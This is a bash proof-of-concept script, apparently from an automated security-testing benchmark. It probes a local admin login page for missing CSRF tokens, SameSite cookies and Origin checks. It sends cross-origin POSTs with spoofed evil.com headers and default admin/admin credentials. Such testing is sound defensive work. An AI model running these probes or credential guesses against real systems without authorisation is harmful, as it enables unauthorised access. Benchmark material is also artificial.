#!/bin/bash
# POC: CSRF vulnerability POC demonstrating missing CSRF protection on login form. Tests for lack of CSRF tokens, validates cross-origin requests are accepted, and checks for missing SameSite cookie protection.
# Target: ./repo
# Created: 2025-11-07T21:43:06.568Z
# Session: benchmark-XBEN-078-24-mhpdbdxp

# CSRF Protection Bypass POC for Admin Login Form
# Demonstrates missing CSRF token validation and cross-origin request acceptance

TARGET_URL="http://localhost:8080/admin.php"
EVIL_ORIGIN="http://evil.com"
EVIL_REFERER="http://evil.com/attack.html"

echo "=========================================="
echo "CSRF Protection Bypass POC"
echo "Target: $TARGET_URL"
echo "=========================================="
echo ""

# Test 1: Check for CSRF tokens in form
echo "[*] Test 1: Checking for CSRF tokens in HTML form..."
FORM_RESPONSE=$(curl -s "$TARGET_URL")
if echo "$FORM_RESPONSE" | grep -iq "csrf\|token\|nonce"; then
    echo "[-] CSRF tokens found in form (protected)"
    TOKEN_FOUND=1
else
    echo "[+] VULNERABILITY: No CSRF tokens found in form"
    TOKEN_FOUND=0
fi
echo ""

# Test 2: Accept cross-origin requests with external Referer
echo "[*] Test 2: Testing cross-origin POST request with external Referer..."
CSRF_TEST=$(curl -s -X POST "$TARGET_URL" \
    -H "Referer: $EVIL_REFERER" \
    -H "Origin: $EVIL_ORIGIN" \
    -d "username=admin&password=admin" \
    -w "\n%{http_code}")

HTTP_CODE=$(echo "$CSRF_TEST" | tail -n1)
RESPONSE_BODY=$(echo "$CSRF_TEST" | head -n-1)

if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ]; then
    echo "[+] VULNERABILITY: Cross-origin request accepted (HTTP $HTTP_CODE)"
    echo "    Server did not reject request from evil.com"
    CSRF_ACCEPTED=1
else
    echo "[-] Cross-origin request rejected (HTTP $HTTP_CODE)"
    CSRF_ACCEPTED=0
fi
echo ""

# Test 3: Check for SameSite cookie protection
echo "[*] Test 3: Checking Set-Cookie headers for SameSite attribute..."
COOKIE_RESPONSE=$(curl -s -i "$TARGET_URL" 2>&1 | grep -i "Set-Cookie")

if echo "$COOKIE_RESPONSE" | grep -iq "SameSite"; then
    echo "[-] SameSite attribute found (protected)"
    SAMESITE_FOUND=1
else
    echo "[+] VULNERABILITY: No SameSite attribute on cookies"
    echo "    Cookie: $COOKIE_RESPONSE"
    SAMESITE_FOUND=0
fi
echo ""

# Test 4: Verify form doesn't require Origin verification
echo "[*] Test 4: Testing if Origin header is validated..."
ORIGIN_TEST=$(curl -s -X POST "$TARGET_URL" \
    -H "Origin: http://malicious-site.com" \
    -d "username=test&password=test" \
    -w "\n%{http_code}")

ORIGIN_HTTP_CODE=$(echo "$ORIGIN_TEST" | tail -n1)

if [ "$ORIGIN_HTTP_CODE" = "200" ] || [ "$ORIGIN_HTTP_CODE" = "302" ]; then
    echo "[+] VULNERABILITY: Suspicious Origin header not validated"
    echo "    Request from malicious-site.com accepted (HTTP $ORIGIN_HTTP_CODE)"
    ORIGIN_VALIDATED=0
else
    echo "[-] Origin header validated/rejected (HTTP $ORIGIN_HTTP_CODE)"
    ORIGIN_VALIDATED=1
fi
echo ""

# Summary
echo "=========================================="
echo "VULNERABILITY SUMMARY"
echo "=========================================="
VULN_COUNT=0

if [ $TOKEN_FOUND -eq 0 ]; then
    echo "[CRITICAL] Missing CSRF tokens"
    ((VULN_COUNT++))
fi

if [ $CSRF_ACCEPTED -eq 1 ]; then
    echo "[CRITICAL] Cross-origin requests accepted without validation"
    ((VULN_COUNT++))
fi

if [ $SAMESITE_FOUND -eq 0 ]; then
    echo "[HIGH] Missing SameSite cookie protection"
    ((VULN_COUNT++))
fi

if [ $ORIGIN_VALIDATED -eq 0 ]; then
    echo "[HIGH] Origin header not validated"
    ((VULN_COUNT++))
fi

echo ""
echo "Total vulnerabilities found: $VULN_COUNT"

if [ $VULN_COUNT -gt 0 ]; then
    echo "Result: CSRF PROTECTION VULNERABLE"
    exit 0
else
    echo "Result: CSRF protection appears adequate"
    exit 1
fi